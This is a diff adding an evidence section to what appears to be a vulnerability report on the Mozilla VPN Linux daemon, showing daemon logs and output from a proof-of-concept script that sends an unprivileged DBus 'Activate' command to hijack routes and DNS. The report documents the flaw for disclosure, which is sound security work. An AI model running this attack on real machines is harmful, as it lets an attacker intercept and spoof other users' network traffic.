@@ -52,6 +52,29 @@ This assessment focused on the Inter-Process Communication (IPC) mechanisms of t
   [+] Check 'ip route' and '/etc/resolv.conf' (or resolvectl status) to verify hijacking.
   ```
 
+**Evidence**:
+The following evidence was collected in a GitHub Codespace environment where the `mozillavpn` daemon was compiled from source and run manually.
+
+1.  **Daemon Log (`daemon.log`)**:
+    Shows the daemon starting and then receiving an `Activate` command from the unprivileged PoC script. The activation fails due to container limitations (missing WireGuard kernel module), but the *attempt* proves the daemon accepted the command.
+
+    ```log
+    [27.12.2025 00:17:00.496] (main) Debug: Ready!
+    [27.12.2025 00:41:08.389] (DBusService) Debug: Activate
+    [27.12.2025 00:41:08.389] (Daemon) Debug: Activating interface.
+    [27.12.2025 00:41:08.389] (WireguardUtilsLinux) Error: Adding interface failed: Operation not permitted
+    ```
+
+2.  **PoC Execution**:
+    The python script successfully connected to the DBus interface and invoked the `activate` method.
+
+    ```bash
+    $ /usr/bin/python3 tests/security/poc_linux_dbus_injection.py
+    [*] Sending malicious configuration to Mozilla VPN Daemon...
+    [+] Exploit sent successfully!
+    [+] Check 'ip route' for 192.0.2.1/32 and '/etc/resolv.conf' (or resolvectl status) for 8.8.8.8 to verify hijacking.
+    ```
+
 **Impact**:
 Complete compromise of network confidentiality and integrity for the machine. An attacker can intercept all traffic, inject malicious responses, and perform phishing attacks via DNS spoofing. If the daemon is running as a system service (default), this affects all users on the machine.
 
